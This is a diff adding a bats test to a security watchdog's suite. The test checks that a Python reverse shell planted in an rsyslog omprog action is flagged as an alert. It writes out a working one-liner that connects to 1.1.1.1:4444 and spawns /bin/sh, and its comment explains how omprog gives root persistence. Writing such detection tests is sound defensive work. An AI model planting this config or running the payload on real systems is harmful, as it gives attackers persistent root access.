@@ -296,3 +296,21 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on rsyslog omprog surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the rsyslog-
+    # omprog log-event-trigger root-exec persistence surface
+    # (T1546/T1037 — omprog action invokes a subprocess AS ROOT
+    # for each matching log event; attacker who plants python
+    # interpreter-rev-shell binary path gets remote shell on
+    # every matching event).
+    printf 'action(type="omprog" binary="/usr/libexec/rsyslog/helper")\n' > "${CONF}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'action(type="omprog" binary="/usr/bin/python" args="-c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\"")\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
